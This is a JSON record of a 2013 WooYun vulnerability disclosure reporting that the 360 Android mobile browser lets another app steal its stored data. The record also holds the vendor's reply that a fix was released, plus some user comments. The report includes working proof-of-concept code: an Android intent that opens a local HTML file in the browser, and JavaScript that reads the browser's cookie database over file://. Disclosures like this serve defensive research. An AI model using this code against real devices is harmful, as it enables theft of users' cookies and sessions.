{"id": 7302, "wybug_id": "wooyun-2013-037836", "wybug_title": "360手机浏览器缺陷可导致用户敏感数据泄漏", "wybug_corp": "奇虎360", "wybug_author": "路人甲", "wybug_date": "2013-09-23 11:09", "wybug_open_date": "2013-12-22 11:09", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-22：\t细节向公众公开  简要描述： 当一个攻击app(恶意或非恶意均可以) 向360浏览器发送请求要求打开一个本地页面时，此本地页面中的可以按照攻击app的要求获取360浏览器下的所有数据，包括cookie信息等，盗取过程无需root，盗取之后可以发送给远程服务器！求奖励！ 详细说明：  Android平台360手机浏览器最新版MD5: 5b252a142a450b34bd3253acb51882bd2013年9月22日 17:00\ncopyFile(); //自定义函数，释放filehehe.html到sd卡上String url = \"file:///mnt/sdcard/filehehe.html\";Intent contIntent = new Intent();contIntent.setAction(\"android.intent.action.VIEW\");contIntent.setData(Uri.parse(url));Intent intent = new Intent();intent.setClassName(\"com.qihoo.browser\",\"com.qihoo.browser.BrowserActivity\");intent.setAction(\"android.intent.action.VIEW\");intent.setData(Uri.parse(url));this.startActivity(intent);\n其中获取关键信息的filehehe.html文件:\nfunction getDatabase() {\t\tvar request = false;    if(window.XMLHttpRequest) {        request = new XMLHttpRequest();\t\tif(request.overrideMimeType) {\t\t\trequest.overrideMimeType('text/xml');\t\t}    }\t    xmlhttp = request;\t\tvar prefix = \"file:////data/data/com.qihoo.browser/databases\";\tvar postfix = \"/webviewCookiesChromium.db\"; //取保存cookie的db\tvar path = prefix.concat(postfix);    // 获取本地文件代码    xmlhttp.open(\"GET\", path, false);    xmlhttp.send(null);    var ret = xmlhttp.responseText;\treturn ret;}\n   漏洞证明：  有代码了要个蛋的证明   修复方案：  限制file域的访问   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-09-23 19:32 厂商回复： 感谢反馈,该漏洞是Android系统webkit内核对本地文件支持存在的漏洞, 在Android 4.1系统中已修复.我们会针对4.0版本及以前版本Android系统加紧推出新版本解决这个安全问题. 最新状态： 2013-09-24：修复此漏洞的版本9月24日已上线。  ", "replys": "漏洞评价：\n评论\n     2013-09-23 11:24 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  →_→神奇的路人甲    \n     2013-09-23 13:05 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  人生的大起大落，简直是太刺激了。    \n     2013-09-24 18:40 |    \t\t一碗菊花茶 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:5        | ，，，。。。，，。。。。，，，。。)\t\t \n  听说上hao123了，    \n     2013-09-24 18:43 |    \t\t一碗菊花茶 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:5        | ，，，。。。，，。。。。，，，。。)\t\t \n  前排出售娃娃    \n     2013-11-04 08:48 |    \t\tACGT \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:4        | another script kiddie)\t\t \n  路人甲怎么奖励。。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}